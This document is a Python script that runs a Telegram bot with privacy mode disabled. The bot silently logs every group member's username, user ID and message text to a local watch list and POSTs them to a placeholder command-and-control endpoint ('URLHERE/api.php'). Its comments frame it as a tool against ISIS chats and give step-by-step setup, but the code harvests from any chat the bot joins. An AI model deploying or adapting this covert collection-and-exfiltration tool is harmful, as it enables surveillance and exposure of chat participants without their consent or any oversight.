#Author:L337H4X0R
#Purpose: Enter ISIS Telegram Chats, Pull usernames and send to C&C System.
#Installation Instructions
#1. Install python-telegram-bot by "pip install python-telegram-bot"
#2. Obtain your token from https://core.telegram.org/bots#botfather (set your bot name conspicuous)
#3. Disable Privacy Mode for your bot by messaging botfather /setprivacy
#4. Add your token to bot = telegram.Bot("")
#5. Run the bot.
#6. Invite the bot into the chat you want to monitor.
#7. Profit??
#Check to see if user has installed python-telegram-bot library.
import telegram

from time import sleep
import urllib.request
try:
    from urllib.error import URLError
except ImportError:
    from urllib2 import URLError  # python 2

def main():
    update_id = None


    # Telegram Bot Authorization Token
    bot = telegram.Bot("")

    while True:
        try:
            update_id = echo(bot, update_id)
        except telegram.TelegramError as e:
            # These are network problems with Telegram.
            if e.message in ("Bad Gateway", "Timed out"):
                sleep(1)
            else:
                raise e
        except URLError as e:
            # These are network problems on our end.
            sleep(1)


def echo(bot, update_id):

    # Request updates after the last update_id
    for update in bot.getUpdates(offset=update_id, timeout=10):
        # chat_id is required to reply to any message
        chat_id = update.message.chat_id
        update_id = update.update_id + 1
        jihadiUsername = update.message.from_user.username
        jihadiID = update.message.from_user.id
        jihadiText = update.message.text

        if jihadiText:
            logFile = open("WatchList.txt", "a")
            logFile.write("Username:" + jihadiUsername + " ID:" + str(jihadiID) + " Message:" + jihadiText + "\n")
            logFile.close()
            url = ('http://URLHERE/api.php')
            data = urllib.parse.urlencode({'user' : jihadiUsername,
                                     'id'  : jihadiID,
                                     'msg' : jihadiText})
            binary_data = data.encode('ascii')
            content = urllib.request.urlopen(url,binary_data)
            print("Username:" + jihadiUsername + " ID:" + str(jihadiID) + " Message:" + str(jihadiText) + "\n")
    return update_id

if __name__ == '__main__':
    main()
